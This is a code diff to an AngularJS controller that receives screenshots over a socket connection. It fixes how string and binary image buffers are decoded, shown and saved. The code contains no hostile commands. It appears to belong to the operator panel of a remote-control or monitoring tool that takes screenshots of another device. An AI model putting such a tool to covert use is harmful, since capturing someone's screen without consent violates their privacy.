@@ -900,12 +900,17 @@ app.controller("ScrCtrl", function ($scope, $rootScope) {
     socket.on(screenCapture, (data) => {
         if (data.file == true) {
             $rootScope.Log('Screenshot arrived', CONSTANTS.logStatus.SUCCESS);
-            var uint8Arr = new Uint8Array(data.buffer);
-            var binary = '';
-            for (var i = 0; i < uint8Arr.length; i++) {
-                binary += String.fromCharCode(uint8Arr[i]);
+            var base64String;
+            if (typeof data.buffer === 'string') {
+                base64String = data.buffer;
+            } else {
+                var uint8Arr = new Uint8Array(data.buffer);
+                var binary = '';
+                for (var i = 0; i < uint8Arr.length; i++) {
+                    binary += String.fromCharCode(uint8Arr[i]);
+                }
+                base64String = window.btoa(binary);
             }
-            var base64String = window.btoa(binary);
             $ScrCtrl.imgUrl = 'data:image/png;base64,' + base64String;
             $ScrCtrl.load = '';
             $ScrCtrl.isSaveShown = true;
@@ -914,7 +919,7 @@ app.controller("ScrCtrl", function ($scope, $rootScope) {
             $ScrCtrl.SaveScreen = () => {
                 $rootScope.Log('Saving screenshot..');
                 var filePath = path.join(downloadsPath, data.name);
-                fs.outputFile(filePath, data.buffer, (err) => {
+                fs.outputFile(filePath, Buffer.from(base64String, "base64"), (err) => {
                     if (err)
                         $rootScope.Log('Saving screenshot failed', CONSTANTS.logStatus.FAIL);
                     else
